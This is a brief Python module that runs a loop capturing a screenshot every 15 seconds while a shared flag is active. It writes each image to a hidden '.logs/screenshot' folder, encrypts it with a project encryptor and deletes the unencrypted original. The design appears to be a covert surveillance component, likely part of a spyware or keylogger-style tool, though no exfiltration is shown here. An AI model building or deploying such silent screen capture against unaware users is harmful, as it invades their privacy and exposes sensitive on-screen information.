import pyautogui, os, time
from core.encryptor import encrypt_data

def screenshot_loop(active):
    """Capture and encrypt screenshots while active."""
    os.makedirs(".logs/screenshot", exist_ok=True)  # Create screenshot log directory if not exists

    while True:
        if active["value"]:  # Only run when activated
            screenshot = pyautogui.screenshot()  # Take screenshot
            ts = time.strftime("%Y%m%d_%H%M%S")  # Timestamp the screenshot
            image_path = f".logs/screenshot/screen_{ts}.png"
            screenshot.save(image_path)  # Save unencrypted temporarily

            with open(image_path, "rb") as f:
                encrypted = encrypt_data(f.read())  # Encrypt the image

            with open(image_path + ".enc", "wb") as f:
                f.write(encrypted)  # Save encrypted version

            os.remove(image_path)  # Remove original unencrypted image

        time.sleep(15)  # Wait 15 seconds before next screenshot
